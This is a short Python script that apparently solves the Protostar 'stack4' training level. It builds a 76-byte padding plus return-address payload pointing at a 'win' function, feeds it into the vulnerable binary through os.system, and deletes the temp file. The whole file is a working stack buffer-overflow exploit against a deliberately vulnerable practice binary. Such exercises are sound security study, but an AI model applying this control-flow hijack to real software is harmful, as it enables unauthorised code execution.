
import os
import struct

sploit = "A"*76 + struct.pack("I", 0x80483f4)
# win - 0x080483f4

with open("/tmp/stack4_sploit", "wb") as f:
	f.write(sploit)
os.system("/opt/protostar/bin/stack4 < /tmp/stack4_sploit")
os.remove("/tmp/stack4_sploit")

